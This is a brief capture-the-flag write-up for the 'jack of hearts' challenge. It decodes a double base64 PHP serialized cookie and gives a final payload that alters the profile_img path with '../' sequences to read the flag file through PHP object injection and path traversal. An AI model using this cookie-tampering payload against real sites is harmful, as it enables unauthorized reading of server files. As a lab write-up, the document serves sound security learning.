# jack of hearts

> Solved By : thewhiteh4t

```
Port : 20022
```

- User cookie is double base64 encoded, so we double decoded and ended up with the following :

```
O:4:"user":3:{
    s:8:"username";s:4:"user";
    s:5:"admin";b:0;
    s:11:"profile_img";s:23:"/var/www/html/guest.png";
}
```

```
O   -> Object
O:4 -> Object of length 4
:3: -> Object has 3 attributes
s   -> String data type
s:8 -> String of length 8
b   -> Boolean data type
b:0 -> False
```

- This was a **PHP Object Injection** challenge
- The goal of this challenge was not to become admin and if we try then the server sends hints or funny responses
- Directly accessing the flag did not work so we can simply use `../`
- Final payload :

```
O:4:"user":3:{
    s:8:"username";s:4:"user";
    s:5:"admin";b:0;
    s:11:"profile_img";s:40:"/var/www/html/../../../../../../flag.png";
}
```

![](https://i.imgur.com/JGNO34j.png)